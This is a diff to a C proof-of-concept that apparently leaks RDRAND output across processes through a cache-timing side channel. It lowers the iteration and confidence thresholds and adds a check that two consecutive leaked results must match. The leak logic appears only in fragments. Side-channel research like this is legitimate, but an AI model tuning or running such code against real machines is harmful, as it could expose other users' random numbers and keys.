@@ -11,8 +11,8 @@
 #include "asm.h"        
 
 #define NUM_SAMPLES 10000
-#define NUM_ITERATIONS 1000
-#define CONFIDENCE_THRESHOLD 800
+#define NUM_ITERATIONS 10
+#define CONFIDENCE_THRESHOLD 2
 #define ROUNDS 100
 #define STRIDE 4096    
 #define POSSIBLE_BYTES 256
@@ -133,6 +133,7 @@ int main(void) {
     size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE| MAP_HUGETLB;
 
     unsigned char result[BYTES_TO_LEAK];
+    unsigned char prev_result[BYTES_TO_LEAK];
     leak = mmap(NULL, leak_len, mmap_prot, mmap_flags, -1, 0);
     if (leak == MAP_FAILED) { perror("mmap leak"); return 1; }
 
@@ -198,8 +199,14 @@ int main(void) {
             result[secret_byte - RDRAND_OFFSET] = max_index;
         }
 
+        if (!is_equal(result, prev_result, BYTES_TO_LEAK))
+        {
+            memcpy(prev_result, result, BYTES_TO_LEAK);
+            continue;
+        }
+
         if (leaked_values_count == 0 ||
-            !is_equal(result, &leaked_values[(leaked_values_count - 1) * BYTES_TO_LEAK], BYTES_TO_LEAK)) 
+            !is_equal(result, &leaked_values[(leaked_values_count - 1) * BYTES_TO_LEAK], BYTES_TO_LEAK))
         {
             for (int i = 0; i < BYTES_TO_LEAK; i++) {
                 leaked_values[(leaked_values_count) * BYTES_TO_LEAK + i] = result[i];
